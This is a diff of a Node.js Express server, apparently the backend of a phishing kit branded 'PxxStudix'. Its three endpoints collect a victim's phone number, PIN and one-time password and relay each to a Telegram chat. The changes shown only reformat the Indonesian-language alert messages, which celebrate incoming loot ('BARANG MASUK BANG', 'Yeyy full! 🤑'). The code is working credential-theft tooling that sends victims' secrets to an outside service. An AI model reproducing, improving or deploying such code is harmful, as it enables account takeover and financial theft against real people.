@@ -74,11 +74,12 @@ app.post("/nmrx", async(req,res) =>{
 
         /* PESAN TELEGRAM */
         const text = `
-💳 <b>| BARANG MASUK BANG |</b> 💳
+💳 <b>| BARANG MASUK BANG |</b> 
+       <code>${nmrx}</code>
 
-×  NMR  ×   : <b><code>${nmrx}</code></b>
-×  POX   ×   : <i>Belum di isi bang</i>
-×  OXT   ×   : <i>Sabar Yashh!</i>
+<b>×  NMR  ×</b>   : <b>${nmrx}</b>
+<b>×  POX   ×</b>   : <i>Belum di isi bang</i>
+<b>×  OXT   ×</b>   : <i>Sabar Yashh!</i>
 
 <b>©️ By PxxStudix</b>
         `;
@@ -171,10 +172,11 @@ app.post("/pix", async(req,res) =>{
         /* PESAN TELEGRAM */
         const text = `
 💳 <b>| BARANG MASUK BANG |</b> 💳
+       <code>${nmrx}</code>
 
-×  NMR  ×   : <b><code>${nmrx}</code></b>
-×  POX   ×   : ${pix}
-×  OXT   ×   : <i>Terakhir nichh!</i>
+<b>×  NMR  ×</b>   : <b>${nmrx}</b>
+<b>×  POX   ×</b>   : <b>${pix}</b>
+<b>×  OXT   ×</b>   : <i>Terakhir nichh!</i>
 
 <b>©️ By PxxStudix</b>
         `;
@@ -269,10 +271,11 @@ app.post("/send", async(req,res) =>{
         /* PESAN TELEGRAM */
         const text = `
 💳 <b>| BARANG MASUK BANG |</b> 💳
+       <code>${nmrx}</code>
 
-×  NMR  ×   : <b><code>${nmrx}</code></b>
-×  POX   ×   : ${pix}
-×  OXT   ×   : ${otp}
+<b>×  NMR  ×</b>   : <b>${nmrx}</b>
+<b>×  POX   ×</b>   : <b>${pix}</b>
+<b>×  OXT   ×</b>   : <b>${otp}</b>
 
 <i>Yeyy full! 🤑</i>
 
